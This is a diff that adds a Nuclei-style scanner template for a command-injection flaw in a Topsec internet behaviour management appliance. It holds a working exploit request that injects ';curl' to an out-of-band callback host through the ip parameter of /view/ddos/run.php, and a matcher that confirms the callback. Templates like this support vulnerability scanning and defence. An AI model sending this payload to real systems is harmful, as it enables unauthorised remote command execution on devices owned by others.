@@ -1,0 +1,31 @@
+id: topsec-ac-run-rce
+info:
+  name: 天融信-上网行为管理系统代码审计命令执行
+  author: leadlife
+  severity: critical
+  description: 由于$ip、$port、$value 均直接从 $_REQUEST 获取，未做任何合法性检查。这些变量被直接拼接进$command，通过proc_open函数完成命令执行，且除 -st 和 -et 参数的值被双引号包裹外，其余参数值均未加引号。攻击者可以在这些参数中注入 shell 元字符（如 ;、&、|、`、$() 等），从而改变原命令的执行逻辑，执行任意命令。
+  reference: 
+    - https://mp.weixin.qq.com/s/exSHealt1J3dmCwd90Cbuw
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: rce,oob,topsec,topsecac
+
+http:
+  - raw:
+      - |
+        GET /view/ddos/run.php?ip=8.8.8.8;curl%20{{interactsh-url}}&port=80&interface_src=eth0&time1=0&time2=0&status=1 HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
